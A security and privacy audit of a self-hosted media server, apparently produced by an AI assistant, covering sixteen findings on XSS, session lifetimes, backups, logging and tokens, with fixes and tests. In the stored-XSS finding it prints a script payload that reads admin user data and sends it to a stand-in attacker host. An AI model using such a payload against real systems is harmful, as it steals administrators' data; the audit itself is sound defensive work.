# Elvern Security & Privacy Audit

> **Audit posture.** This file is a security review, not an implementation plan. No code changes were made. The findings below are organized in the format requested by the user; the "patch plan" sections describe *what* to change but should be approved before any edit.

---

## Context

Elvern is a self-hosted private media server (FastAPI + React, SQLite-backed) intended to run inside a Tailscale tailnet. The audit was driven by user concerns over:

1. Privacy of family / personal media and metadata.
2. Auth, session safety, token handling, access control.
3. Download/streaming/handoff link reuse and revocation.
4. Data leakage via filenames, logs, network inspection, browser storage, caches, manifests, temp files, backups.
5. Password hashing, key handling, signing, post-quantum readiness.

The threat model assumed: a curious household member, a disabled/revoked user, a user with an old copied link, someone with local device access, someone inspecting DevTools, someone who exfiltrates a backup folder, and a low-privilege account on the same tailnet. We did **not** assume an attacker outside the tailnet (Tailscale provides the perimeter and TLS).

---

## A. Executive Summary

- **Overall risk level: MEDIUM**, dominated by stored-XSS-by-design in the assistant attachment endpoint, ghost-session lifetimes after logout for external-player handoffs, and a misleading "private network only" toggle that does nothing. None are immediately exploitable from outside the tailnet. Within-tailnet exploitability is real for several findings.
- **Top 5 findings (full list in §C):**
  1. **F-01 (HIGH)** — Stored XSS in `/api/assistant/attachments/{id}`: file is served with the **uploader-supplied** `Content-Type` as `inline` with no `X-Content-Type-Options: nosniff` and no app-wide CSP. An assistant-beta user can drop an HTML/SVG file that runs as same-origin script when an admin (or anyone) opens it.
  2. **F-02 (HIGH)** — VLC / Infuse / iOS native-playback sessions are deliberately created with `auth_session_id = None` so that **logout does not revoke them**. They live for `ELVERN_EXTERNAL_PLAYER_STREAM_TTL_SECONDS` (default 12 h, max 24 h) and are reachable with just a 256-bit bearer token whose URL form is handed to VLC via a `vlc-x-callback://` deep link.
  3. **F-03 (MEDIUM)** — `ELVERN_PRIVATE_NETWORK_ONLY` is read, displayed, and logged but **never enforced**. The only real perimeter control is `ELVERN_BIND_HOST=127.0.0.1`. A misleading switch is worse than no switch.
  4. **F-04 (MEDIUM)** — `ELVERN_SESSION_TTL_HOURS` defaults to **720 hours (30 days)**. A stolen cookie file is good for a month and there is no rotation on privilege change or password change. Combined with no global security headers (CSP/HSTS/X-Frame-Options/nosniff), it amplifies any XSS or device-theft incident.
  5. **F-05 (MEDIUM)** — Backups are an unencrypted, world-readable-once-extracted dump of the entire SQLite DB **plus** `deploy/env/elvern.env` (which contains `ELVERN_SESSION_SECRET`, `ELVERN_GOOGLE_OAUTH_CLIENT_SECRET`, and the admin password hash). Permissions on the directory are correct (0700/0600), but the *content* has no encryption at rest. Anyone who walks off with a single backup folder can fork the install and impersonate the admin.
- **Immediately exploitable from outside the tailnet?** No — backend binds to 127.0.0.1 by default; sole external surface is whatever the operator publishes themselves.
- **Is user privacy adequately protected?** Mostly yes, with concrete shortfalls: `original_filename` and `file_path` are returned in JSON for any logged-in user; native-playback debug logs (INFO level) record `original_filename`, `user_agent`, `item_id`, ranges, and full request paths for any non-loopback request; download URLs and `Content-Disposition` use the original on-disk filename when available. None of these are catastrophic, but they're visible and avoidable.

---

## B. Architecture Map

**Frontend** (React + Vite, served by [frontend/server.mjs](frontend/server.mjs) which is a 1-file Node reverse proxy to the FastAPI backend).
- Auth UI: [frontend/src/auth/AuthContext.jsx](frontend/src/auth/AuthContext.jsx)
- API client: [frontend/src/lib/api.js](frontend/src/lib/api.js) (uses `credentials: "include"` everywhere)
- Pages of interest: [frontend/src/pages/AdminPage.jsx](frontend/src/pages/AdminPage.jsx), [frontend/src/pages/DetailPage.jsx](frontend/src/pages/DetailPage.jsx), [frontend/src/pages/DesktopPage.jsx](frontend/src/pages/DesktopPage.jsx)
- Service worker: [frontend/public/sw.js](frontend/public/sw.js) — self-unregisters on activate; no caching.
- PWA manifest: [frontend/public/manifest.webmanifest](frontend/public/manifest.webmanifest)

**Backend** (FastAPI, `app.state` carries singletons; [backend/app/main.py](backend/app/main.py)).
- Routes (all under `/api/...`):
  - Auth: [backend/app/routes/auth.py](backend/app/routes/auth.py)
  - Admin: [backend/app/routes/admin.py](backend/app/routes/admin.py), [admin_assistant.py](backend/app/routes/admin_assistant.py)
  - Library: [backend/app/routes/library.py](backend/app/routes/library.py)
  - Stream / playback: [stream.py](backend/app/routes/stream.py), [playback.py](backend/app/routes/playback.py), [browser_playback.py](backend/app/routes/browser_playback.py), [mobile_playback.py](backend/app/routes/mobile_playback.py), [native_playback.py](backend/app/routes/native_playback.py), [desktop_playback.py](backend/app/routes/desktop_playback.py)
  - Download: [download.py](backend/app/routes/download.py)
  - Assistant: [assistant.py](backend/app/routes/assistant.py)
  - Cloud: [cloud_libraries.py](backend/app/routes/cloud_libraries.py)
  - Helper: [desktop_helper.py](backend/app/routes/desktop_helper.py)
  - Debug / system: [debug.py](backend/app/routes/debug.py), [system.py](backend/app/routes/system.py)
- Auth core: [backend/app/auth.py](backend/app/auth.py), [backend/app/security.py](backend/app/security.py)
- Config: [backend/app/config.py](backend/app/config.py) (env-driven `Settings`)
- DB schema: [backend/app/db.py](backend/app/db.py)
- Services (used by routes; the real business logic):
  - [account_access_service.py](backend/app/services/account_access_service.py) — invite codes, download sessions
  - [native_playback_service.py](backend/app/services/native_playback_service.py)
  - [desktop_playback_service.py](backend/app/services/desktop_playback_service.py)
  - [library_service.py](backend/app/services/library_service.py), [library_presentation_service.py](backend/app/services/library_presentation_service.py)
  - [assistant_service.py](backend/app/services/assistant_service.py)
  - [backup_service.py](backend/app/services/backup_service.py)
  - [cloud_provider_auth_service.py](backend/app/services/cloud_provider_auth_service.py), [cloud_library_service.py](backend/app/services/cloud_library_service.py), [google_drive_service.py](backend/app/services/google_drive_service.py)
  - [audit_service.py](backend/app/services/audit_service.py)
  - [media_stream.py](backend/app/media_stream.py) (`ensure_media_path_within_root`)

**Auth & session flow.**
- Login (`POST /api/auth/login`) → `authenticate_user` → `create_session` returns 384-bit `secrets.token_urlsafe(48)`; only `sha256(session_secret + ":" + token)` is stored in `sessions`. Cookie set `HttpOnly`, `Secure` (default), `SameSite=Lax`, `Path=/`, `Max-Age=session_ttl_hours*3600` ([auth.py:432-441](backend/app/auth.py#L432-L441)).
- Each protected route depends on `CurrentUser = Depends(require_authenticated_user)`; the dependency re-hashes the cookie token, joins `sessions × users`, requires `revoked_at IS NULL AND expires_at > now AND u.enabled = 1` ([auth.py:233-256](backend/app/auth.py#L233-L256)).
- Admin routes use `CurrentAdmin = Depends(require_admin_user)` ([auth.py:480-486](backend/app/auth.py#L480-L486)).

**Media / download / streaming flow.**
- Browser direct playback: `GET /api/stream/{item_id}` (`stream.py`) → `build_cloud_stream_response` → resolves a row in `media_items.file_path`, validates with `ensure_media_path_within_root` ([media_stream.py:19-29](backend/app/media_stream.py#L19-L29)). Range requests honored.
- HLS: `GET /api/hls/{item_id}/index.m3u8` and `/{segment_name}` ([playback.py:83-109](backend/app/routes/playback.py#L83-L109)) — both auth-gated; manifests sent with `Cache-Control: private, no-store`.
- Mobile / browser Route 2: `POST /api/mobile-playback/sessions` → in-memory manager, session bound to user + `auth_session_id`, segments require `CurrentUser`.
- Native playback (VLC / Infuse / desktop helper): see §C F-02; sessions are deliberately auth-decoupled.
- Download: `POST /api/download/item/{id}/session` issues a 256-bit token (also requires `CurrentUser` to use); session is bound to `user_id` and `auth_session_id`, 10-minute TTL.

**Caching / browser state.**
- Service worker self-unregisters on activate ([frontend/public/sw.js](frontend/public/sw.js)); no offline cache.
- `localStorage` keys (sensitive only):
  - `elvern-admin-invite-codes` — **plaintext invite codes** for re-display ([AdminPage.jsx:131](frontend/src/pages/AdminPage.jsx#L131)).
  - `elvern_device_id`, `elvern-mobile-app-status:*`, debug toggles — non-sensitive.
- `sessionStorage` keys: OAuth intent, library return target, iOS handoff result — all non-sensitive.

**Logging.**
- [backend/app/main.py:40-44](backend/app/main.py#L40-L44) sets `logging.basicConfig(level=ELVERN_LOG_LEVEL)`. INFO is default. The startup banner logs `media_root` and `db_path` paths in the clear ([main.py:62-66](backend/app/main.py#L62-L66)). Several services log original filenames and item IDs at INFO (see F-13).

**Backups.**
- [backup_service.py:240-335](backend/app/services/backup_service.py#L240-L335). Each checkpoint is a directory in `backend/data/backups/elvern-backup-<UTC>` (mode 0o700, files 0o600) containing `elvern.db`, `deploy/env/elvern.env`, `helper_releases/`, `assistant_uploads/`, and a `manifest.json` with `"contains_secrets": true`. **No encryption.**

**Files inspected directly (read with file tool; not just grep):**
- [backend/app/auth.py](backend/app/auth.py)
- [backend/app/security.py](backend/app/security.py)
- [backend/app/main.py](backend/app/main.py)
- [backend/app/config.py](backend/app/config.py)
- [backend/app/routes/native_playback.py](backend/app/routes/native_playback.py) (full)
- [backend/app/routes/download.py](backend/app/routes/download.py) (full)
- [backend/app/routes/desktop_playback.py](backend/app/routes/desktop_playback.py) (full)
- [backend/app/routes/desktop_helper.py](backend/app/routes/desktop_helper.py)
- [backend/app/routes/assistant.py](backend/app/routes/assistant.py) (full)
- [backend/app/routes/cloud_libraries.py](backend/app/routes/cloud_libraries.py) (relevant lines)
- [backend/app/routes/debug.py](backend/app/routes/debug.py) (head)
- [backend/app/services/native_playback_service.py](backend/app/services/native_playback_service.py) (head + decoupling logic)
- [backend/app/services/account_access_service.py](backend/app/services/account_access_service.py) (download + invite paths)
- [backend/app/services/library_service.py](backend/app/services/library_service.py) (detail builder)
- [backend/app/services/library_presentation_service.py](backend/app/services/library_presentation_service.py) (serialization)
- [backend/app/services/assistant_service.py](backend/app/services/assistant_service.py) (attachment serving)
- [backend/app/services/backup_service.py](backend/app/services/backup_service.py) (creation flow)
- [frontend/src/lib/api.js](frontend/src/lib/api.js)
- [frontend/public/sw.js](frontend/public/sw.js), [frontend/public/manifest.webmanifest](frontend/public/manifest.webmanifest)
- [frontend/server.mjs](frontend/server.mjs) (head)
- [frontend/src/pages/AdminPage.jsx](frontend/src/pages/AdminPage.jsx) (storage + util block)

Areas where I relied on grep + spot-checks rather than full reads: route2 transcoder internals, hidden-items routes, scan service, video-codec details. None of those are on the security boundary, but they're not exhaustively covered.

---

## C. Findings Table

### F-01 — Stored XSS in assistant attachment inline endpoint
- **Severity:** HIGH | **Confidence:** HIGH
- **Affected:** [backend/app/routes/assistant.py:92-106](backend/app/routes/assistant.py#L92-L106), [backend/app/services/assistant_service.py:477-494](backend/app/services/assistant_service.py#L477-L494)
- **Evidence.** The route serves the file with the **uploader's `Content-Type`** verbatim, `Content-Disposition: inline`, and **no `X-Content-Type-Options: nosniff`** (compare with the `/raw/assistant-images/{ticket_id}` route at line 152 which *does* set nosniff). There is no global CSP. `_read_attachment` accepts any MIME (only the attachment_type tag is image/text/other), persists `mime_type` to the DB, and `get_assistant_attachment_file` returns whatever was stored.
- **Exploit scenario.** A user with `assistant_beta_enabled=1` POSTs a request with `attachment` whose body is `<script>fetch('/api/admin/users',{credentials:'include'}).then(r=>r.json()).then(j=>fetch('https://attacker/log',{method:'POST',body:JSON.stringify(j)}))</script>` and `Content-Type: text/html` (or an SVG with embedded `<script>`). When an **admin** opens the attachment via `/api/assistant/attachments/{id}` to triage the request, the page runs in the Elvern origin. The session cookie is `HttpOnly`, but `credentials: "include"` means the script can call any admin endpoint as the admin: enumerate users, hide invite codes, revoke sessions, exfiltrate audit logs, change another user's password (admin password is required for that, but XSS can wait for the admin to type it).
- **Privacy impact.** Full read access to admin-visible data; loss of the admin perimeter.
- **Fix.** (1) Whitelist MIME types on upload (image/png|jpeg|webp|gif|heic|avif, text/plain, application/pdf — same family used in `ASSISTANT_EXTERNAL_IMAGE_MIME_TYPES`). (2) Force served `Content-Type` to a server-side sanitized value derived from server-detected extension/magic bytes, not from the uploader. (3) Always set `X-Content-Type-Options: nosniff` and `Content-Security-Policy: default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; sandbox` on this route. (4) For non-image previews, force `Content-Disposition: attachment`.
- **Minimal patch.** Modify `_read_attachment` to reject non-allowlisted MIMEs, and modify `assistant_attachment_view` to add the headers above and override `media_type` based on a server-side inferred safe value.
- **Tests needed.** (a) Upload `.html` is rejected at upload time. (b) Attempt to fetch a stored attachment, response carries `nosniff` + restrictive CSP. (c) Round-trip test of an image still renders correctly. (d) Negative test: SVG with `<script>` is either rejected on upload or served with a sanitized content-type.

### F-02 — External-player native playback survives logout (and admin session-revoke does not touch it)
- **Severity:** HIGH | **Confidence:** HIGH
- **Affected:** [backend/app/routes/native_playback.py:316-323, 444-511, 514-528, 608-713](backend/app/routes/native_playback.py), [backend/app/services/native_playback_service.py:353-361](backend/app/services/native_playback_service.py#L353-L361), [backend/app/auth.py:387-429, 599-635](backend/app/auth.py)
- **Evidence.** `should_decouple_external_player_auth_session` returns true for `external_player ∈ {vlc, infuse}` and for any `client_name` matching `"linux same-host vlc"` / `"vlc helper fallback"` / `"vlc playlist fallback"` / iOS handoff client names. The session is then created with `auth_session_id=None`. The `/session/{session_id}/stream` endpoint has **no `CurrentUser` dependency** — it accepts only `?token=` or `Authorization: Bearer`. `destroy_session` (the logout path) only revokes `native_playback_sessions WHERE auth_session_id = row["id"]`; rows with `auth_session_id IS NULL` are skipped. Admin per-session revoke (`_revoke_session_ids`) has the same behavior. Only `revoke_sessions_for_user_in_connection` (called when an admin **disables** a user) revokes by `user_id` and catches the decoupled rows.
  - TTL is `ELVERN_EXTERNAL_PLAYER_STREAM_TTL_SECONDS` (default 43200 s = 12 h, valid range 600..86400).
  - The handoff URL embedded in the iOS deep link is of the form `vlc-x-callback://x-callback-url/stream?url=https%3A//host/api/native-playback/session/{id}/stream%3Ftoken%3D{tok}` — token in query string.
- **Exploit / failure scenario.** Family member opens "Watch in VLC" on phone, then logs out of the web UI, intending to "end" the session. Their VLC bookmark / iOS share menu / clipboard / app-switcher snapshot still contains the deep-link URL. They (or anyone with brief access to that phone) can replay the URL and stream the file for up to 12 hours after logout. Same applies to a teen handing the phone back. Admin revoking the auth session through the UI does *not* revoke the stream either; admin must disable the user account.
- **Privacy impact.** Continued access to media after the user (or admin) intended to terminate it. The token is not visible in the browser DevTools Network tab (it lives in the iOS deep-link URL), but it is exposed wherever VLC / iOS logs URLs.
- **Fix.** Three options, in increasing fidelity:
  1. **Minimum.** When `destroy_session` runs, ALSO revoke `native_playback_sessions WHERE user_id = ? AND auth_session_id IS NULL AND created_at >= last_login_at_for_user`. Same for admin per-session revoke. This kills decoupled handoffs created during the same login.
  2. **Better.** Stop decoupling. Bind the native session to `auth_session_id` always; refresh the auth session via the heartbeat endpoint (which already exists). When VLC stops calling, the auth session times out anyway.
  3. **Best.** Bind to `auth_session_id`, *and* lower default TTL to 1–2 hours, *and* require user-presence ack to extend.
- **Minimal patch.** In `destroy_session` add an additional `UPDATE native_playback_sessions SET revoked_at = ? WHERE user_id = (SELECT user_id FROM sessions WHERE id = ?) AND auth_session_id IS NULL AND revoked_at IS NULL AND closed_at IS NULL AND created_at >= (SELECT created_at FROM sessions WHERE id = ?)`. (And mirror in `_revoke_session_ids`.)
- **Tests needed.** (a) Create a VLC handoff, logout, attempt to fetch stream → 401. (b) Create a VLC handoff, admin revokes that auth session, attempt to fetch stream → 401. (c) Create a VLC handoff, do nothing, fetch stream → 200 (regression).

### F-03 — `ELVERN_PRIVATE_NETWORK_ONLY` is decorative
- **Severity:** MEDIUM | **Confidence:** HIGH
- **Affected:** [backend/app/config.py:118, 216](backend/app/config.py), and only callers: [services/status_service.py:69](backend/app/services/status_service.py#L69), [services/transport_controller_service.py:44](backend/app/services/transport_controller_service.py#L44), [frontend/src/pages/AdminPage.jsx:2499](frontend/src/pages/AdminPage.jsx#L2499)
- **Evidence.** The setting defaults `True`, the admin status panel proudly displays "Private-only mode: Enabled", but no middleware reads the value. Effective network restriction comes solely from `ELVERN_BIND_HOST=127.0.0.1` (which is unrelated). If an operator decides to expose the backend on `0.0.0.0` thinking the toggle still protects them, they get nothing.
- **Exploit scenario.** Operator runs `ELVERN_BIND_HOST=0.0.0.0` to "let other devices on the LAN connect", trusts the "Private-only mode: Enabled" indicator, and now the entire LAN can reach `/api/login`. Or: operator puts Elvern behind a reverse proxy in front of Tailscale and the indicator misrepresents reality.
- **Privacy impact.** Operators may misunderstand their actual exposure. Indirect.
- **Fix.** Either (a) remove the setting and the UI text, or (b) actually enforce it: a startup-time validator that refuses to start if `private_network_only=True` and `bind_host` is not loopback or RFC1918 / Tailscale CGNAT 100.64/10, plus a request-time middleware that 403s when `request.client.host` isn't in the allowed range.
- **Minimal patch.** Option (b) startup validator only; ship the middleware later.
- **Tests needed.** (a) Setting `ELVERN_PRIVATE_NETWORK_ONLY=True` + `ELVERN_BIND_HOST=0.0.0.0` raises `ConfigError`. (b) Setting both true with `bind_host=127.0.0.1` boots normally.

### F-04 — 30-day session cookie default + no rotation on sensitive events
- **Severity:** MEDIUM | **Confidence:** HIGH
- **Affected:** [backend/app/config.py:213](backend/app/config.py#L213) (`session_ttl_hours=_get_int("ELVERN_SESSION_TTL_HOURS", 24 * 30)`), [auth.py:432-441](backend/app/auth.py#L432-L441)
- **Evidence.** `Max-Age` is set to `session_ttl_hours * 3600`; default 720 h = 30 days. There is no logic that rotates the session token when the user changes their password ([admin_service.update_user_password](backend/app/services/admin_service.py)) or when an admin promotes/demotes the user (the role change is reflected on next request because `role` comes from a JOIN, but the same token continues to authenticate). The cookie is `HttpOnly`+`Secure`+`SameSite=Lax`, which is fine; the *lifetime* is the issue.
- **Exploit / failure scenario.** Stolen browser profile / device backup containing the cookie file gives an attacker a valid session for a month. Password change does not invalidate it.
- **Privacy impact.** Wide window for credential-equivalent theft.
- **Fix.** (1) Reduce default to 7 days and document a "stay signed in" UX toggle. (2) On `update_user_password` for the actor and on role change, call `revoke_sessions_for_user(... reason="credentials_changed")` — keep the *current* session if the actor is doing the change themselves by reissuing a fresh token in the same response. (3) Consider sliding expiry: refresh `expires_at` on each heartbeat up to a hard cap.
- **Minimal patch.** Drop default to 168 h, and call `revoke_sessions_for_user_in_connection` (already exists) in the password-change path.
- **Tests needed.** (a) After password change, old cookie returns 401. (b) After role demotion from admin, admin endpoints return 403 on next request (regression — already true today but worth pinning). (c) Default TTL is 168 h, configurable.

### F-05 — Backups are unencrypted and contain the secret env file
- **Severity:** MEDIUM-HIGH | **Confidence:** HIGH
- **Affected:** [backend/app/services/backup_service.py:240-335](backend/app/services/backup_service.py#L240-L335). Verified by inspecting `backend/data/backups/elvern-backup-20260507-232609Z/` on disk: contains `elvern.db`, `deploy/env/elvern.env` (which holds `ELVERN_SESSION_SECRET`, `ELVERN_GOOGLE_OAUTH_CLIENT_SECRET`, `ELVERN_ADMIN_PASSWORD_HASH`), `helper_releases/`, `assistant_uploads/`. Permissions are 0o700/0o600 — that is good — but no encryption.
- **Evidence.** `manifest["contains_secrets"] = True` (line 312); `BACKUP_WARNING = "This backup may contain secrets. Do not commit or share it."` Comments confirm the design accepts this. There is no rate limiting on `POST /api/admin/backups`, and admin-only `GET /api/admin/backups/{id}/inspect` reveals the manifest including paths and `initiated_by_username`.
- **Exploit scenario.** An admin syncs the project directory to Dropbox / iCloud / Google Drive without thinking, or grabs a backup folder onto a USB stick to "test the restore at home". Whoever picks that up next has every secret needed to spin up a clone of the install or impersonate the admin.
- **Privacy impact.** Total. Hashed passwords, all OAuth tokens for cloud sources, audit logs, watch history.
- **Fix.** (1) Encrypt the env file inside the backup with a passphrase derived from a per-install backup key (stored separately or prompted at restore), or (2) at minimum, exclude the env file by default unless `include_env=True` is passed, and surface a loud warning + checksum on the API response. (3) Document a recommended off-host backup workflow that uses age / GPG / restic with an external passphrase.
- **Minimal patch.** Make `include_env` default `False` for the API entry point (CLI can keep its current default if local-only). Update the manifest UI to display the warning prominently.
- **Tests needed.** (a) Backup created via API with default args has no env file. (b) Backup created via CLI still has env file (regression). (c) Restore plan flags missing env explicitly.

### F-06 — No global security headers (CSP / HSTS / X-Frame-Options / nosniff)
- **Severity:** MEDIUM | **Confidence:** HIGH
- **Affected:** [backend/app/main.py](backend/app/main.py) (no middleware), [frontend/server.mjs](frontend/server.mjs) (no header injection).
- **Evidence.** `app = FastAPI(...)` is followed only by `include_router` calls; no `app.add_middleware` calls anywhere. Grep for `X-Frame|Content-Security-Policy|Strict-Transport-Security|nosniff` returns *one* hit, the assistant raw-image route. Frontend proxy passes through whatever the backend sends.
- **Exploit scenario.** Any future XSS (F-01 today) or content-type confusion bug has no defense in depth. If the operator publishes the UI publicly via a reverse proxy without HSTS, a network-level attacker can downgrade.
- **Privacy impact.** Indirect amplifier for other findings.
- **Fix.** Add a small `SecurityHeadersMiddleware`:
  - `Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src 'self' blob:; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`
  - `Strict-Transport-Security: max-age=31536000` (only when request is https)
  - `X-Content-Type-Options: nosniff`
  - `Referrer-Policy: strict-origin-when-cross-origin`
  - `Permissions-Policy: camera=(), microphone=(), geolocation=()`
- **Minimal patch.** ~25 lines in `main.py`; verify against the PWA's actual asset paths first because Vite/PWA may need `style-src 'unsafe-inline'`.
- **Tests needed.** (a) Every endpoint sets `nosniff`. (b) `frame-ancestors 'none'` is set. (c) Existing pages still load (manual smoke test).

### F-07 — Admin invite codes stored in admin localStorage in plaintext
- **Severity:** MEDIUM | **Confidence:** HIGH
- **Affected:** [frontend/src/pages/AdminPage.jsx:38, 114-141, 499](frontend/src/pages/AdminPage.jsx)
- **Evidence.** `ADMIN_INVITE_CODE_STORAGE_KEY = "elvern-admin-invite-codes"`. `writeStoredInviteCodes` writes the plaintext codes to `localStorage` so they can be redisplayed later (the server only stores SHA256(secret + ":" + code)). The DB never has the plaintext, so this is the only client-side store.
- **Exploit scenario.** Any XSS (F-01) reads `localStorage.getItem("elvern-admin-invite-codes")` and gets all unexpired codes. A second-hand laptop containing an admin browser profile yields the codes too.
- **Bound.** Codes have a 30-minute server TTL ([account_access_service.py:20](backend/app/services/account_access_service.py#L20)), so the window is small.
- **Privacy impact.** Codes grant signup. Within a tailnet that's bounded to whoever can reach the server, but it's still account creation.
- **Fix.** Two options: (1) Show the code **once** in a one-shot modal, never persist it. Admin must regenerate if they need it again. (2) Encrypt it in localStorage with a key kept in `sessionStorage` so it dies with the browser tab — partial mitigation only.
- **Minimal patch.** Option (1): remove the localStorage round-trip; show the code once on creation.
- **Tests needed.** (a) Generated code appears once, not after refresh. (b) Refreshing admin page does not show plaintext codes from localStorage.

### F-08 — `file_path` and `original_filename` leaked in JSON responses
- **Severity:** LOW-MEDIUM | **Confidence:** HIGH
- **Affected:** [backend/app/services/library_service.py:395](backend/app/services/library_service.py#L395) (`"file_path": media_row["file_path"]`), [services/library_presentation_service.py:377](backend/app/services/library_presentation_service.py#L377) (`"original_filename": row["original_filename"]`), [services/account_access_service.py:624-635](backend/app/services/account_access_service.py#L624-L635) (download session response includes both `download_filename` and `original_filename`), [routes/native_playback.py:197](backend/app/routes/native_playback.py#L197) (debug log includes `original_filename`).
- **Evidence.** Both fields appear in the responses for any logged-in user. `file_path` in particular is the absolute on-disk path.
- **Exploit / privacy scenario.** A standard user inspecting DevTools sees host paths like `/mnt/dgx/movies/Folder/Movie.Title.2023.UNTOUCHED.WEB-DL.HEVC-GROUP.mkv`. That reveals (a) the directory layout of the host (helpful for a follow-up traversal exploit), (b) the release-group / source watermark in filenames (which a user may not realize is identifiable), (c) the file system that backs the library. None of that is necessary for the UI; the UI already builds display titles from the parser.
- **Fix.** Stop returning `file_path` to non-admin users; use `original_filename` only for the admin views and rename the field to `library_filename` so admins know it. The library list UI never needs `file_path` — only `id` and the resolved presentation fields.
- **Minimal patch.** Strip `file_path` from `get_media_item_detail`'s payload unless `user.role == "admin"`. Strip `original_filename` from non-admin responses for the library list (`_serialize_media_item`).
- **Tests needed.** (a) `/api/library` for a standard user contains no `file_path` and no `original_filename`. (b) Admin response still includes them. (c) Player still works (it only needs `id`).

### F-09 — Native-playback debug log emits original_filename, range, query, UA, paths at INFO
- **Severity:** MEDIUM | **Confidence:** HIGH
- **Affected:** [backend/app/routes/native_playback.py:152-214, 280-296](backend/app/routes/native_playback.py)
- **Evidence.** `_should_log_native_stream_debug` returns true for any non-loopback request OR any user-agent containing "vlc". The payload includes `original_filename`, `client_host`, `user_agent`, `range`, `query`, `path`, `item_id`, etc. and is emitted with `logger.info(...)`. Default log level is INFO, so this lands in syslog / journald / Docker logs by default.
- **Privacy impact.** The host's logs become a log of *which user watched which file from which device at which time-offset*, in plain text. Anyone with read access to the systemd journal sees the watch history of every household member.
- **Fix.** Move to `logger.debug` (gate behind `ELVERN_LOG_LEVEL=DEBUG`). Strip `original_filename` and `query` from any log even at debug — replace with `media_item_id` and a redacted query. Apply the same `_redact_url_tokens` regex already present in [debug.py:29-35](backend/app/routes/debug.py#L29-L35).
- **Minimal patch.** Demote to debug + redact the two fields.
- **Tests needed.** (a) INFO logs do not contain "original_filename" string. (b) DEBUG logs redact tokens.

### F-10 — Token in URL query for desktop helper / handoff endpoints
- **Severity:** LOW-MEDIUM | **Confidence:** HIGH
- **Affected:** [routes/desktop_playback.py:218, 253](backend/app/routes/desktop_playback.py), [routes/desktop_helper.py:69](backend/app/routes/desktop_helper.py#L69), [routes/native_playback.py:518, 535, 552, 572, 593, 612](backend/app/routes/native_playback.py) (token also accepted in query for the bearer-style endpoints).
- **Evidence.** `token: str = Query(...)` (helper handoffs) or `token: str | None = Query(default=None)` (native playback) means the token is in the URL. URLs land in: server access logs (uvicorn does not log access lines by default but a deployment behind nginx/Traefik will), browser history, `Referer` headers if the page navigates, OS-level URL handlers (the iOS deep-link case is the worst because the URL passes through the iOS share / SpringBoard subsystem).
- **Fix.** Make the canonical access path `Authorization: Bearer ...` and accept query token only for the iOS deep-link case (where header injection isn't possible). Rotate any token on first use; keep TTL short. The current `_resolve_access_token` already prefers the query token over the header — invert the precedence so the header wins.
- **Minimal patch.** Invert preference in `_resolve_access_token`. Add logging suppression in `uvicorn` config to drop `?token=` queries.
- **Tests needed.** (a) `Authorization: Bearer <good>` + `?token=<bad>` succeeds. (b) Query-only still works for redirect / deep-link case.

### F-11 — Trusted `X-Forwarded-For` and UA-mixed login bucket
- **Severity:** MEDIUM | **Confidence:** HIGH
- **Affected:** [backend/app/auth.py:70-83](backend/app/auth.py#L70-L83)
- **Evidence.** `resolve_client_ip` blindly returns the first item of `X-Forwarded-For` if present. `build_login_client_bucket` keys on `(ip, user_agent)`, so an attacker can vary UA to refresh the bucket; or set XFF to spoof a different bucket per attempt.
- **Privacy/security impact.** Login rate-limit per IP is bypassable; audit logs record attacker-controlled IP strings as if real. Bounded today by Tailscale-only deployment, but if you ever expose behind nginx/Caddy and forget to lock XFF, you eat the bypass.
- **Fix.** (1) Add `ELVERN_TRUST_X_FORWARDED_FOR=False` default; only honor XFF when the immediate `request.client.host` is in a configured trust list (e.g. `127.0.0.1`). (2) For the rate-limit bucket, key on IP only (or on `username` to fail-closed across IPs), not on UA.
- **Minimal patch.** Two new envs; bucket on IP+username, not IP+UA.
- **Tests needed.** (a) Without trust setting, XFF ignored. (b) Bucket no longer bypassable by UA rotation.

### F-12 — `upload.read()` reads full body before size check
- **Severity:** LOW-MEDIUM | **Confidence:** HIGH
- **Affected:** [backend/app/routes/assistant.py:37-47](backend/app/routes/assistant.py#L37-L47)
- **Evidence.** `content = await upload.read()` happens unconditionally, then `len(content) > MAX_ATTACHMENT_BYTES` is checked. Concurrent attackers can each buffer 8 MB+ in memory.
- **Fix.** Stream-read in chunks, abort once the cumulative size exceeds the cap. Or set a global `app.add_middleware(LimitRequestSizeMiddleware, max_size=...)`.
- **Tests needed.** (a) 9 MB upload aborts before allocating 9 MB. (b) Existing tests still pass.

### F-13 — Session token hash is plain SHA256 with concat, not HMAC
- **Severity:** LOW | **Confidence:** HIGH
- **Affected:** [backend/app/security.py:58-59](backend/app/security.py#L58-L59) (`hashlib.sha256(f"{session_secret}:{token}".encode()).hexdigest()`)
- **Evidence.** Used for `sessions.session_token_hash`, download-session token hash, native-playback access-token hash. Functionally fine for the *current* threat model (256-bit pre-image-resistant; the secret + 256-bit token are concatenated, not the kind of length-extension target SHA-256 is famous for, since both inputs are fixed-length and we're building a key not a MAC). But: convention says **HMAC-SHA256** for "I'm using a key with a hash"; that's both more obvious to reviewers and avoids the construction smell. Constant-time comparison happens in SQL so timing isn't an issue.
- **Fix.** Replace with `hmac.new(session_secret.encode(), token.encode(), hashlib.sha256).hexdigest()`. Migrate by writing both the new and old hash transiently or by a one-shot table rewrite at upgrade.
- **Tests needed.** Migration test that an existing session continues to validate after upgrade.

### F-14 — Login rate limiter is in-memory, restart-cleared
- **Severity:** LOW | **Confidence:** HIGH
- **Affected:** [backend/app/security.py:62-112](backend/app/security.py#L62-L112)
- **Evidence.** State is a Python dict guarded by a lock. A reboot clears all blocks. Acceptable for a single-process self-hosted service; flag only.
- **Fix.** None required. If multi-process workers ever land, move to DB-backed.
- **Tests needed.** None new.

### F-15 — Cookie has no explicit `__Host-` prefix; cross-subdomain risk if ever served
- **Severity:** LOW | **Confidence:** MEDIUM
- **Affected:** [backend/app/auth.py:432-441](backend/app/auth.py#L432-L441)
- **Evidence.** Cookie name is `elvern_session` (configurable). No `__Host-` prefix. `domain` not set (default = exact host). For Tailscale, fine; for any future LAN-with-subdomains deployment, a sibling app could shadow the cookie.
- **Fix.** Optional hardening: rename to `__Host-elvern_session` when running over HTTPS; update cookie spec accordingly.
- **Tests needed.** None new.

### F-16 — No CORS middleware (acceptable, flag for awareness)
- **Severity:** INFO | **Confidence:** HIGH
- **Affected:** [backend/app/main.py](backend/app/main.py)
- **Evidence.** No `CORSMiddleware` registered. Cross-origin requests fail by browser default; SameSite=Lax cookie + same-origin fetches give the system de-facto CSRF protection for state-changing endpoints (Lax does block cross-site POSTs).
